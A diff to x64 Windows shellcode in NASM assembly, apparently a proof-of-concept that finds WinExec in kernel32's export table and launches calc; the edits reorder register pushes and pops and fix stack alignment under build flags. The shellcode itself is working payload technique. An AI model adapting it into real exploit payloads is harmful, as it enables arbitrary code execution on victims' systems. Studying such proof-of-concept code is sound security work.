@@ -45,6 +45,7 @@ shellcode:
 %else
 %ifdef FUNC
 %ifdef CLEAN
+    PUSH    RAX                           ; exchanged RDX
     PUSH    RCX
 %endif
     PUSH    RBX
@@ -53,7 +54,9 @@ shellcode:
     PUSH    RBP                           ; Stack now ends with 8 (!CLEAN) or is 16 byte (CLEAN) aligned
 %endif
 %ifdef CLEAN
+%ifndef STACK_ALIGN
     PUSH    RAX                           ; dummy push to make stack end with 8 before next push
+%endif
 %endif
     MOV     DL, 0x60
 %endif
@@ -94,16 +97,12 @@ find_winexec_x64:
     MOV     ESI, [RSI + RBP * 4]          ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
     ADD     RDI, RSI                      ; RDI = kernel32 + offset(WinExec) = WinExec
 ; Found WinExec (RDI)
-    CDQ                                   ; RDX = 0 (assumping EAX < 0x80000000, which should always be true)
+    CDQ                                   ; RDX = 0 (assuming EAX < 0x80000000, which should always be true)
     CALL    RDI                           ; WinExec(&("calc"), 0);
 %ifdef FUNC
 %ifdef CLEAN
 %ifdef STACK_ALIGN
-%ifndef PLATFORM_INDEPENDENT
     ADD     RSP, 0x68                     ; reset stack to where it was after pushing registers
-%else
-    ADD     RSP, 0x70                     ; reset stack to where it was after pushing registers
-%endif
 %else
     ADD     RSP, 0x70                     ; reset stack to where it was after pushing registers
 %endif
@@ -129,12 +128,12 @@ find_winexec_x64:
 %else
 %ifdef CLEAN
     POP     RCX                           ; POP additional registers
+    POP     RDX
 %endif
 %ifdef STACK_ALIGN
     POP     RSP
 %endif
 %ifdef CLEAN
-    POP     RDX
     POP     RAX
 %endif
     RET                                   ; Return
